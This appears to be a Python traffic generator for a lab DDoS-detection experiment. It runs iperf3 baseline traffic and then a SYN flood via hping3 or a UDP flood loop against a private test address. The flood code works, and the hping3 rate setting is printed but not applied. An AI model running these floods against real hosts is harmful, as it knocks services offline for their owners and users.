#!/usr/bin/env python3
"""
traffic/traffic_gen.py

Wraps iperf3 (benign baseline, TCP or UDP) and hping3 / a raw UDP flood
(attack) so a single command runs one experiment configuration end-to-end,
matching the Phase 5 experiment matrix.

Proposal Step 2 requires benign traffic using "both TCP and UDP streams" --
--baseline-protocol controls this (default both, matching the proposal).

Must be run with sudo (raw sockets for UDP flood, hping3 needs root).

Run:
    sudo python3 traffic/traffic_gen.py \\
        --mode both --type syn \\
        --baseline-protocol both \\
        --intensity medium --duration 60 --baseline 10
"""
import argparse
import socket
import subprocess
import time
import random

INTENSITY_PPS = {"low": 5000, "medium": 20000, "high": 50000}
TARGET_IP = "10.0.0.12"
TARGET_PORT = 80


def run_baseline(duration, protocol="both"):
    print(f"[baseline] starting iperf3 benign traffic for {duration}s (protocol={protocol})")
    procs = []
    pairs = [(1, 12), (2, 11), (3, 10), (4, 9)]
    if protocol in ("tcp", "both"):
        for src, dst in pairs:
            cmd = ["iperf3", "-c", f"10.0.0.{dst}", "-p", "5201", "-t", str(duration), "-b", "10M"]
            print("  [TCP]", " ".join(cmd))
            procs.append(subprocess.Popen(cmd))
    if protocol in ("udp", "both"):
        for src, dst in pairs:
            cmd = ["iperf3", "-c", f"10.0.0.{dst}", "-p", "5202", "-u",
                   "-t", str(duration), "-b", "5M"]
            print("  [UDP]", " ".join(cmd))
            procs.append(subprocess.Popen(cmd))
    return procs


def run_syn_flood(duration, intensity):
    pps = INTENSITY_PPS[intensity]
    print(f"[attack] SYN flood -> {TARGET_IP}:{TARGET_PORT} intensity={intensity} (~{pps} pps) for {duration}s")
    cmd = ["hping3", "--syn", "--flood", "-p", str(TARGET_PORT), TARGET_IP]
    print("  ", " ".join(cmd), f" # run for {duration}s then Ctrl+C / pkill hping3")
    proc = subprocess.Popen(cmd)
    time.sleep(duration)
    proc.terminate()
    return proc


def run_udp_flood(duration, intensity):
    pps = INTENSITY_PPS[intensity]
    print(f"[attack] UDP flood -> {TARGET_IP}:{TARGET_PORT} intensity={intensity} (~{pps} pps) for {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytes(random.getrandbits(8) for _ in range(512))
    interval = 1.0 / pps
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        sent += 1
        time.sleep(interval)
    sock.close()
    print(f"[attack] UDP flood finished, sent {sent} packets")


def main():
    parser = argparse.ArgumentParser(description="Traffic generator: benign baseline + DDoS attacks")
    parser.add_argument("--mode", choices=["baseline", "attack", "both"], default="both")
    parser.add_argument("--type", choices=["syn", "udp"], default="syn")
    parser.add_argument("--baseline-protocol", choices=["tcp", "udp", "both"], default="both",
                         help="benign traffic protocol mix (proposal requires both)")
    parser.add_argument("--intensity", choices=["low", "medium", "high"], default="medium")
    parser.add_argument("--duration", type=int, default=60, help="attack duration (s)")
    parser.add_argument("--baseline", type=int, default=10, help="baseline warm-up duration (s)")
    args = parser.parse_args()

    if args.mode in ("baseline", "both"):
        run_baseline(args.baseline, args.baseline_protocol)
        time.sleep(args.baseline)

    if args.mode in ("attack", "both"):
        if args.type == "syn":
            run_syn_flood(args.duration, args.intensity)
        else:
            run_udp_flood(args.duration, args.intensity)

    print("Run complete.")


if __name__ == "__main__":
    main()
